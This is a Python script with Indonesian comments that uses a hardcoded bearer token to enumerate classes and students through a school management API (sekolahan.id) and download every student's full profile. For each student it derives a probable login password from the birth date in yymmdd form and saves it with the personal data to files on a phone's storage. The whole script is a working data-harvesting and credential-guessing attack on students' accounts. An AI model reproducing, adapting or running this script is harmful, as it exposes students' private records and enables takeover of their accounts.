import os
import requests
from datetime import datetime

bearer = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJzbWstY2FrcmEtbnVzYW50YXJhLnNla29sYWhhbi5pZCIsImF1ZCI6IjEwLjEzMC40Ni41OCIsImlhdCI6MTcwNDYyMDU1NSwibmJmIjoxNzA0NjIwNTY1LCJkYXRhIjp7ImlkIjpudWxsfX0._9Geu5biEBUJ6jf89FtuINcP1rDcPHZ0t9vOAQN1hZk"
idsekolah = input("Masukkan ID Sekolah: ")
output_folder = r"/sdcard/SID"

# URL untuk mendapatkan data kelas
kelas_url = f"https://demo.sekolahan.id/api/{idsekolah}/datakelas"
response_kelas = requests.get(kelas_url)

if response_kelas.status_code == 200:
    data_kelas = response_kelas.json()["responseData"]["results"]

    for kelas in data_kelas:
        kelas_id = kelas["kelasid"]
        nama_kelas = kelas["namakelas"]
        print(f"Nama Kelas: {nama_kelas}")

        # Membuat body untuk request list siswa kelas
        body_siswa = {"idkelas": kelas_id, "idsiswa": ""}
        
        # Mendapatkan list siswa kelas
        list_siswa_url = f"https://demo.sekolahan.id/api/v2/{idsekolah}/listsiswakelas"
        response_siswa = requests.post(list_siswa_url, headers={"Authorization": f"Bearer {bearer}"}, data=body_siswa)

        if response_siswa.status_code == 200:
            data_siswa = response_siswa.json().get("responseData", {}).get("results", [])

            if data_siswa:
                # Menyimpan data siswa dan profil dalam satu file txt
                output_file_path = os.path.join(output_folder, f"{nama_kelas}.txt")
                with open(output_file_path, "w") as file:
                    file.write(f"=== Data Siswa ===\n")
                    file.write(f"Total Siswa di Kelas {nama_kelas}: {len(data_siswa)}\n\n")
                    
                    for siswa in data_siswa:
                        idsiswa = siswa.get('idsiswa', '')
                        # Membuat body untuk request profil siswa
                        body_profil = {"idsiswa": idsiswa}
                        
                        # Mendapatkan profil siswa
                        profil_siswa_url = f"https://demo.sekolahan.id/api/v2/{idsekolah}/profilsiswa"
                        response_profil = requests.post(profil_siswa_url, headers={"Authorization": f"Bearer {bearer}"}, data=body_profil)

                        if response_profil.status_code == 200:
                            data_profil = response_profil.json().get("responseData", {}).get("results", {})
                            tgllahir = data_profil.get("tgllahir", "")
                            
                            # Pengecekan tanggal lahir
                            if tgllahir and tgllahir != '0000-00-00':
                                password = datetime.strptime(tgllahir, "%Y-%m-%d").strftime("%y%m%d")
                            else:
                                password = "default_password"
                            
                            # Menyimpan data profil siswa dalam file txt
                            file.write(f"=== Profil Siswa ===\n")
                            file.write(f"ID Siswa: {idsiswa}\n")
                            file.write(f"Password: {password}\n")
                            for key, value in data_profil.items():
                                file.write(f"{key}: {value}\n")
                            file.write("\n")
                        else:
                            print(f"Gagal mendapatkan profil siswa. Nama: {siswa.get('nama', '')}, ID Siswa: {idsiswa}")
                            file.write(f"=== Gagal Mendapatkan Profil Siswa ===\n")
                            file.write(f"Nama: {siswa.get('nama', '')}\n")
                            file.write(f"ID Siswa: {idsiswa}\n\n")
                            
                print(f"Total siswa di kelas {nama_kelas}: {len(data_siswa)}")
                print(f"Data kelas {nama_kelas} berhasil disimpan.")
            else:
                print("Data siswa tidak ditemukan.")
        else:
            print(f"Gagal mendapatkan list siswa kelas. Status code: {response_siswa.status_code}")
else:
    print(f"Gagal mendapatkan data kelas. Status code: {response_kelas.status_code}")